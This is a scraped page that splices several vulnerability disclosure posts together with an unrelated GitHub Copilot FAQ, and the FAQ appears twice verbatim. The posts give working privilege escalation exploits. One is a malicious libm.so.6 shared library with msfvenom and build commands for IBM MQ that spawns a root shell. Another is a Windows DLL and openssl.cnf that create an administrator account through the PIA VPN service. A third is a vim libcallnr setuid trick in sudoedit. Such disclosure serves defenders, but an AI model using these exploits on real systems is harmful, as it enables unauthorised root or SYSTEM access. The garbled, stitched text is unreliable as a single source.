Here is what [ltrace](http://man7.org/linux/man-pages/man1/ltrace.1.html) output looks like. Note the -S option is required to show system calls.

```
[mqm@localhost ~]$ ltrace -S -f /opt/mqm/bin/security/amqoamax 2>&1|grep libm.so.6
[pid 1627] open@SYS("/opt/mqm/lib64/libm.so.6", 524288, 036656000520) = -2
[pid 1627] open@SYS("/opt/mqm/gskit8/lib64/libm.so.6", 524288, 036656000520) = -2
[pid 1627] open@SYS("/lib64/libm.so.6", 524288, 036656000520) = 3

```

By default /opt/mqm/lib64 is owned by the mqm user but has permissions of 555 so mqm cannot write files there. Change the permissions to 755.

```
mqm@localhost ~]$ ls -ld /opt/mqm/lib64
dr-xr-xr-x. 3 mqm mqm 4096 Nov  9 22:04 /opt/mqm/lib64
[mqm@localhost ~]$ chmod 755 /opt/mqm/lib64
[mqm@localhost ~]$ ls -ld /opt/mqm/lib64
drwxr-xr-x. 3 mqm mqm 4096 Nov 9 22:04 /opt/mqm/lib64
```
### Payload Creation

The goal is to create a malicious library named libm.so.6 to execute arbitrary code as root. For this PoC we will create a small C program to execute a shell. The full PoC can be found on my github page [CVE-2018-1792.sh](https://github.com/mirchr/security-research/blob/master/vulnerabilities/IBM/CVE-2018-1792.sh).

```

/* woot.c */
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void woot(){
  setreuid(0,0);
  setregid(0,0);
  execl("/bin/sh","/bin/sh",NULL);
}

```

You can also generate a library with msfvenom. I generally avoid using msfvenom because it’s simple to use the above.

```

# msfvenom alternative
msfvenom -p linux/x64/exec \
         PrependSetgid=yes \
         PrependSetuid=yes \
         CMD=/bin/bash \
         -f elf-so \
         -o /opt/mqm/lib64/libm.so.6

```

Build the library libm.so.6 and store it in /opt/mqm/lib64.

```
[mqm@localhost lib64]$ gcc -fPIC -o woot.o -Wall -c woot.c
[mqm@localhost lib64]$ gcc -Wall -shared \
                           -Wl,-soname,libm.so.6 \
                           -Wl,-init,woot \
                           -o /opt/mqm/lib64/libm.so.6 woot.o

```

Execute /opt/mqm/bin/security/amqoamax or /opt/mqm/bin/security/amqoampx to obtain a root shell.

```
[mqm@localhost ~]$ id
uid=996(mqm) gid=1005(mqm) groups=1005(mqm)
[mqm@localhost ~]$ /opt/mqm/bin/security/amqoamax
sh-4.2# id
uid=0(woot) gid=0(woot) groups=0(woot),1005(mqm)
sh-4.2#

```

## Conclusion

When hunting for vulnerabilities in privileged binaries on UNIX/Linux systems always check the RPATH/RUNPATH value. If there is a path that is writable it can be leveraged to escalate privileges.

### Frequently asked questions

#### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

#### Who is eligible to access GitHub Copilot for free?

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

#### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

1. Data from June 2023. Additional research can be found [here](https://github.blog/news-insights/research/the-economic-impact-of-the-ai-powered-developer-lifecycle-and-lessons-from-github-copilot/).
2. Feature in public beta for Copilot Pro and Business plans. Requires use of repositories, issues, discussions, Actions, and other features of GitHub.
3. Authentication with SAML single sign-on (SSO) available for organizations using GitHub Enterprise Cloud.

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

1. Data from June 2023. Additional research can be found [here](https://github.blog/news-insights/research/the-economic-impact-of-the-ai-powered-developer-lifecycle-and-lessons-from-github-copilot/).
2. Feature in public beta for Copilot Pro and Business plans. Requires use of repositories, issues, discussions, Actions, and other features of GitHub.
3. Authentication with SAML single sign-on (SSO) available for organizations using GitHub Enterprise Cloud.

Author: Rich Mirch
CVE: CVE-2019-12572
Vendor Advisory: N/A
Blog Post: https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/
Description
A vulnerability in the London Trust Media Private Internet Access (PIA) VPNClient 1.0.2 (build 02363) for Windows could allow an authenticated, localattacker to run arbitrary code with elevated privileges.
On startup the PIA Windows service(pia-service.exe) loads the OpenSSL library fromC:\Program Files\Private Internet Access\libeay32.dll. This library attemptsto load the c:\etc\ssl\openssl.cnf configuration file which does not exist. Bydefault on Windows systems, authenticated users can create directories under c:\.A low privileged user can create an openssl.cnf configuration file to load amalicious OpenSSL engine library resulting in the arbitrary code execution asSYSTEM when the service starts.
CVSS
Vector: CVSS:3.0/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H/E:H/RL:U/RC:CBase: 7.8Temporal: 7.8
Test Environment
OS: Windows 10 Pro 10.0.17763PIA Version: 1.0.2 (build 02363)
Steps to reproduce
Note: All steps are executed using a low privileged account.
1) Create the c:\etc\ssl directory
mkdir c:\etc\ssl
2) Create a malicious engine library named woot.dll to create an administratoraccount named woot when loaded.
/\* Cross Compile with x86\_64-w64-mingw32-g++ woot.c -o woot.dll -shared\*/#include <windows.h>BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved ){ switch( fdwReason ) { case DLL\_PROCESS\_ATTACH: system("cmd /c net user woot insertpasswordhere /add"); system("cmd /c net localgroup administrators woot /add"); break; case DLL\_THREAD\_ATTACH: // Do thread-specific initialization. break; case DLL\_THREAD\_DETACH: // Do thread-specific cleanup. break; case DLL\_PROCESS\_DETACH: // Perform any necessary cleanup. break; } return TRUE; // Successful DLL\_PROCESS\_ATTACH.}
3) Copy the malicious woot.dll file into the c:\etc\ssl folder.
copy woot.dll c:\etc\ssl
4) Create the OpenSSL configuration file in c:\etc\ssl\openssl.cnf with the following contents.
openssl\_conf = openssl\_init[openssl\_init]engines = engine\_section[engine\_section]woot = woot\_section[woot\_section]engine\_id = wootdynamic\_path = c:\\etc\\ssl\\woot.dllinit = 0
5) Reboot the system because a low privilege user does not have permission torestart the service.
6) After the reboot has completed, login and open a command shell. At this pointthe "woot" administrator account will exist.
net user woot

In 2021 I discovered several high and critical vulnerabilities in the [Kaseya Unitrends](https://www.unitrends.com/products/unitrends-backup-appliances) backup appliance. This research was conducted and published as part of my day job. Part one details a chain of vulnerabilities by leveraging an insecure [PostgreSQL](https://www.postgresql.org/) database to ultimately gain shell access to the remote server. Visit <https://www.cyberonesecurity.com/blog/exploiting-kaseya-unitrends-backup-appliance-part-1> for the the full write-up. Stay tuned for part two.

[January 25, 2021January 25, 2021](https://blog.mirch.io/2021/01/25/sudoedit-lpe/ "8:43 pm")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

I noticed the following changelog entry in sudo [1.9.5p1.](https://www.sudo.ws/stable.html#1.9.5p1) This caught my attention so I decided to look further. I was unable to find an advisory, PoC, or CVE for this vulnerability. Using the details from the changelog message and fix, I decided to write an exploit for it.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image.png?w=1024)

Using an Ubuntu 20.04.1 VM, I created a low privileged user named “lowpriv” and added a sudoedit rule for a root owned file /etc/test.txt. I also downloaded the [source](https://github.com/sudo-project/sudo/archive/SUDO_1_9_5.tar.gz) for sudo 1.9.5, compiled it, and installed it to /opt/sudo.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-3.png?w=1024)

Show sudoedit rule.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-1.png?w=1024)

Show the sudo version is 1.9.5.

With the test environment ready I ran sudoedit /etc/test.txt. I executed !id as a quick test which executes the id command in a shell however privileges are dropped by bash when the UID != EUID. Back to the drawing board.

I was able to successfully edit arbitrary files simply using the :e /etc/sudoers or :e /etc/shadow commands to escalate privileges, however that was too easy.

Looking for esoteric features that could potentially be leveraged, I discovered the libcall and libcallnr functions which allow you to execute a function from an external library. The one caveat is there can only be a single argument. There are a crazy amount of functions available to vim that I never realized. Check out <https://vim.help/41-write-a-vim-script#41.6> for the full listing.

I tried calling a variety of functions with varying degrees of success but found a simple method by calling [setuid()](https://man7.org/linux/man-pages/man2/setuid.2.html) directly.

`call libcallnr("libc.so.6","setuid",0)`

After running sudoedit, use the following vim/ex command to change the UID to zero. This will ensure that shelling out will retain privileges because now UID==EUID.

Execute a bash shell with !bash.

Interactive root shell obtained. Woot!

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-10.png?w=1024)

I tested the same proof of concept with 1.9.5p1 and sudoedit properly drops privileges as expected.

**Summary**

If you upgraded to sudo 1.9.5 to fix [CVE-2021-23240](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-23240) or [CVE-2021-23239](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-23239), a new privilege escalation vulnerability was introduced in sudoedit and you should upgrade to 1.9.5p1.

Once in a while I look at recently fixed vulnerabilities to see if I can bypass the fix. In this case, the sudo project knew about this vulnerably but to my knowledge no advisory or CVE was created. I think this is odd that the issue was not communicated since a valid privilege escalation was patched. It’s unclear if another researcher reported it or if maintainers discovered it during their own testing. I also could not find a proof of concept so I decided to write one as a fun exercise.

I hope you enjoyed the short write up. Hit me me up on Twitter [@0xm1rch](https://twitter.com/0xm1rch) if you have any questions or comments.

Pi-hole v5.2.1 is vulnerable to a critical stored cross site scripting vulnerability. An attacker with the ability to directly or indirectly query DNS with a malicious hostname can cause arbitrary JavaScript to execute when the Pi-hole administrator accesses the Query Log or Long-term Query Log pages on the web portal.

The Pi-hole project released a fix on 12/24/2020 in v5.2.2. Shodan reports over 7,500 Pi-hole instances. This could be remotely exploited if these instances permit external DNS queries. Other possibilities may exist if a malformed DNS query is allowed.

No payloads are being published at this time to give users time to patch.

## [CVE-2019-19954 Signal Desktop Windows Elevation of Privilege Vulnerability](https://blog.mirch.io/2019/12/18/signal-desktop-windows-lpe/)

[December 18, 2019August 6, 2020](https://blog.mirch.io/2019/12/18/signal-desktop-windows-lpe/ "7:25 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

# Vulnerability Summary

